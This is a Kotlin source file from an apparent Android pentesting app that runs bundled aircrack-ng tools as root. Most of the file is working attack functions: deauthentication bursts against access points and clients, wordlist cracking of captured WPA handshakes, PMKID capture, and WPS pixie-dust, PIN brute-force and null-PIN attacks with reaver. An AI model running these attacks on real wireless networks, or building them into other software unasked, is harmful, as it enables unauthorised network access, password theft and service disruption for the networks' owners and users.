/*
 * Copyright 2026 Varakumar.
 *
 * This file is part of GhostWire.
 *
 * GhostWire is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * GhostWire is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with GhostWire.  If not, see <https://www.gnu.org/licenses/>.
 */

package org.ghostwire

import android.content.Context
import java.io.File

/**
 * The aircrack-ng suite, bundled and run as root — self-contained, no Kali
 * chroot or NetHunter needed.
 *
 * The binaries in assets/wifi/bin are statically-linked aarch64 Android
 * executables (built with the NDK; see assets/wifi/SOURCE), so they need no
 * shared libraries. They are copied to the app's files dir and chmod'd 755 on
 * first use, then exec'd as root with the capture dir as cwd. Monitor mode and
 * con_mode are handled Android-side in [WifiIface]; only the capture/attack
 * tools go through here.
 *
 * Attack command flags mirror wifite2's (GPLv2 — flags are facts about the
 * tools, reimplemented, not ported).
 */
class WifiTools(context: Context) {

    private val base = File(context.filesDir, "wifi")
    private val binDir = File(base, "bin")
    private val assets = context.assets

    /** Capture dir airodump/hcx write to and we read back (as root). */
    val workDir: String = File(base, "work").apply { mkdirs() }.absolutePath

    var installed: Boolean = false
        private set

    private val core = listOf("airodump-ng", "aireplay-ng", "aircrack-ng", "iw")

    /** Extract + chmod the bundled binaries. Idempotent, cheap to rerun. */
    fun ensure(): Boolean {
        binDir.mkdirs()
        val names = runCatching { assets.list("wifi/bin") }.getOrNull().orEmpty()
        for (n in names) {
            if (n == "SOURCE") continue
            val out = File(binDir, n)
            if (out.exists() && out.length() > 0) continue
            runCatching { assets.open("wifi/bin/$n").use { it.copyTo(out.outputStream()) } }
        }
        Root.run("chmod 755 ${binDir.absolutePath}/* 2>/dev/null")
        installed = core.all { File(binDir, it).exists() }
        return installed
    }

    fun path(tool: String): String = File(binDir, tool).absolutePath
    fun hasTool(tool: String): Boolean = File(binDir, tool).exists()

    /** Bundled wordlist for offline cracking, extracted on first use. Replaceable. */
    val wordlist: String by lazy {
        val f = File(base, "wordlist.txt")
        if (!f.exists() || f.length() == 0L)
            runCatching { assets.open("wifi/wordlist.txt").use { o -> f.outputStream().use { o.copyTo(it) } } }
        f.absolutePath
    }

    /**
     * Run "tool args …" as root with cwd = capture dir. [bg] launches it detached
     * (airodump) and returns at once.
     */
    fun exec(toolLine: String, bg: Boolean = false): String {
        val line = "${binDir.absolutePath}/$toolLine"
        // Most tools are static, but a few (aircrack-ng) are dynamically linked against the
        // bundled libc++_shared.so — point the loader at the bin dir for all of them.
        val env = "export LD_LIBRARY_PATH=${binDir.absolutePath}:\$LD_LIBRARY_PATH; "
        val body = "cd $workDir && $env" + (if (bg) "setsid $line >/dev/null 2>&1 </dev/null &" else line)
        return Root.run(body).out
    }

    /** Newest capture-dir file matching a glob ("" if none). */
    fun newest(glob: String): String =
        Root.run("ls -1t $workDir/$glob 2>/dev/null | head -n 1").out.trim()

    fun report(): String {
        val all = core + listOf("reaver", "wash", "bully", "pixiewps", "hcxdumptool", "hcxpcapngtool")
        return all.joinToString("\n") { "  ${if (hasTool(it)) "✓" else "·"} $it" }
    }

    // ---- streaming output -----------------------------------------------------

    /** Absolute path of a scratch log in the capture dir (for live tailing from the UI). */
    fun workFile(name: String): String = "$workDir/$name"

    /** Current contents of a work file, for the output dialog to poll. */
    fun readFile(abs: String): String = Root.run("cat '$abs' 2>/dev/null").out

    /**
     * Run [cmd] (built with absolute tool paths) as root with cwd = capture dir. When
     * [outAbs] is given, the combined stdout+stderr is teed there (truncated first) so the
     * UI can tail it live. Blocks until the tool exits; returns the full output.
     */
    private fun runAttack(cmd: String, outAbs: String?): String {
        val env = "export LD_LIBRARY_PATH=${binDir.absolutePath}:\$LD_LIBRARY_PATH; "
        val body = if (outAbs != null)
            "cd $workDir && $env: > '$outAbs'; $cmd >> '$outAbs' 2>&1; cat '$outAbs'"
        else "cd $workDir && $env$cmd 2>&1"
        return Root.run(body).out
    }

    // ---- attacks (wifite2 flags) ----------------------------------------------

    /** Targeted deauth: n bursts at an AP, optionally one client. Streams to [out]. */
    fun deauth(iface: String, bssid: String, client: String?, bursts: Int = 5, out: String? = null): String {
        if (!WifiIface.valid(iface) || !bssid.matches(MAC)) return "invalid target"
        val c = client?.takeIf { it.matches(MAC) }?.let { "-c $it" } ?: ""
        return runAttack("${path("aireplay-ng")} -0 $bursts --ignore-negative-one -a $bssid -D $c $iface", out)
    }

    /**
     * Offline crack of a captured handshake against a wordlist with aircrack-ng. Streams
     * progress to [out]; returns the recovered key or a not-found note.
     */
    fun crack(capPath: String, bssid: String, wordlist: String, out: String): String {
        if (capPath.isBlank()) return "no capture file — grab a handshake first."
        if (!bssid.matches(MAC)) return "invalid bssid"
        if (!File(wordlist).exists()) return "wordlist missing: $wordlist"
        runAttack("${path("aircrack-ng")} -w '$wordlist' -b $bssid '$capPath'", out)
        // Root.run returns "(no output)" when a command prints nothing, so test for the
        // actual marker rather than blankness.
        val key = Root.run("grep -a 'KEY FOUND' '$out' 2>/dev/null | head -n1").out.trim()
        return if ("KEY FOUND" in key) key
        else "Key not found in wordlist. Capture clean? Try a bigger list."
    }

    /**
     * Confirm a WPA handshake in [capPath] for [bssid] via hcxpcapngtool producing
     * a WPA*02/03/04 line. null = hcxpcapngtool not bundled (so no false positive).
     */
    fun hasHandshake(capPath: String, bssid: String): Boolean? {
        if (capPath.isBlank()) return false
        if (!hasTool("hcxpcapngtool")) return null
        exec("hcxpcapngtool -o hs.22000 '$capPath' 2>/dev/null")
        val hit = Root.run("grep -ci '^WPA\\*0[234]\\*' '$workDir/hs.22000' 2>/dev/null").out
            .trim().toIntOrNull() ?: 0
        return hit > 0
    }

    /**
     * PMKID capture: hcxdumptool for up to [secs], then hcxpcapngtool. A 22000
     * hash file lands in the capture dir on success.
     */
    fun pmkid(iface: String, bssid: String, channel: Int, secs: Int = 30, out: String? = null): String {
        if (!hasTool("hcxdumptool") || !hasTool("hcxpcapngtool"))
            return "hcxdumptool/hcxpcapngtool not installed."
        val chan = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
        exec("rm -f pmkid.pcapng pmkid.22000 2>/dev/null")
        runAttack("timeout $secs ${path("hcxdumptool")} -i $iface -w pmkid.pcapng $chan --rds=1", out)
        exec("hcxpcapngtool -o pmkid.22000 pmkid.pcapng 2>/dev/null")
        val b = bssid.replace(":", "").lowercase()
        val hit = Root.run("grep -i '$b' '$workDir/pmkid.22000' 2>/dev/null | grep -c '^WPA\\*01'")
            .out.trim().toIntOrNull() ?: 0
        return if (hit > 0) "PMKID captured ✓ — $workDir/pmkid.22000 (crack with hashcat -m 22000)"
        else "No PMKID in ${secs}s (AP may not expose one). Saved pmkid.pcapng."
    }

    /**
     * WPS pixie-dust / PIN with reaver (or bully). Runs up to [secs]; returns the
     * tool's own PIN/PSK result lines or a timeout note.
     */
    fun wps(iface: String, bssid: String, channel: Int, pixie: Boolean, secs: Int = 120, out: String? = null): String {
        if (!bssid.matches(MAC)) return "invalid bssid"
        if (!hasTool("reaver")) return "reaver not installed."
        val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
        val k = if (pixie) "-K" else ""
        val full = runAttack("timeout $secs ${path("reaver")} -i $iface -b $bssid $ch -vv -N $k", out)
        return summariseReaver(full, secs)
    }

    /**
     * WPS null-PIN attack (reaver `-p ''`): some APs accept an empty PIN and leak the PSK.
     * A fast, low-noise check worth trying before a full PIN brute. Streams to [out].
     */
    fun wpsNull(iface: String, bssid: String, channel: Int, secs: Int = 60, out: String? = null): String {
        if (!bssid.matches(MAC)) return "invalid bssid"
        if (!hasTool("reaver")) return "reaver not installed."
        val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
        val full = runAttack("timeout $secs ${path("reaver")} -i $iface -b $bssid $ch -vv -N -p ''", out)
        return summariseReaver(full, secs)
    }

    private fun summariseReaver(full: String, secs: Int): String =
        full.lineSequence()
            .filter { Regex("WPS PIN|WPA PSK|pixie|locked|rate limit|not found|empty pin", RegexOption.IGNORE_CASE).containsMatchIn(it) }
            .toList().takeLast(20).joinToString("\n")
            .ifBlank { "reaver ran up to ${secs}s, no PIN/PSK recovered." }

    companion object {
        private val MAC = Regex("^[0-9A-Fa-f:]{17}$")
    }
}
